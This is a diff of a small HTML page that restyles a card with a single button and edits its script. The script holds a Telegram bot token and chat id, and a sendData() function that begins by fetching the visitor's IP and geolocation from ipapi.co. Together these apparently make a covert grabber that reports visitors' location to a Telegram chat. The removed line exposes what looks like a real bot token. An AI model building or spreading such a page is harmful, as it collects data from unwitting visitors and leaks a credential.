@@ -7,35 +7,48 @@
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f4f4f9;
+            background-color: #f0f2f5;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
+            box-sizing: border-box;
             color: #333;
         }
         .card {
             background: #ffffff;
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 35px 25px;
+            border-radius: 20px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
             text-align: center;
-            max-width: 400px;
-            width: 90%;
+            max-width: 380px;
+            width: 100%;
+        }
+        h2 {
+            margin-top: 0;
+            margin-bottom: 15px;
+            font-size: 22px;
+            color: #111;
+        }
+        p {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 25px;
         }
         .btn {
             background-color: #007aff;
             color: white;
             border: none;
-            padding: 12px 20px;
+            padding: 14px 20px;
             font-size: 16px;
-            border-radius: 8px;
+            border-radius: 12px;
             cursor: pointer;
             width: 100%;
-            margin-top: 20px;
             font-weight: bold;
+            transition: background-color 0.2s;
         }
         .btn:active {
             background-color: #0056b3;
@@ -51,8 +64,8 @@
     </div>
 
     <script>
-        const BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ";
-        const CHAT_ID = "9011362716";
+        const BOT_TOKEN = "TÖKÊN_I_NWÊ";
+        const CHAT_ID = "CHAT_ID_I_NWÊ";
 
         function sendData() {
             fetch('https://ipapi.co/json/')
